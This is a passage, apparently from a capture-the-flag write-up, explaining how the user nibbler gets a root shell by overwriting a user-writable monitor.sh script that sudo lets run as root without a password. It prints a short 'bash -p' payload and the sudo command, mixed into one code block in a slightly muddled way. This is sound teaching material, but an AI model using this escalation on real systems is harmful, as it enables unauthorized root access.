In this case, nibbler owns the script or has write access to it. That means they can change its contents to anything they want, and then run it as root using sudo.

### What in the script allows this?

The problem isn’t the content of the script itself — the real issue is that the script is both:

1. **Writable by a non-root user**, and
2. **Executable as root using sudo without a password**.

Even though the original script contains logic and checks (like using `ping`, `curl`, etc.), none of that matters. The attacker can **replace the entire script** with a simple payload like:

```
#!/bin/bash
bash -p
sudo /home/nibbler/personal/stuff/monitor.sh
```
will start a new shell with **root privileges**.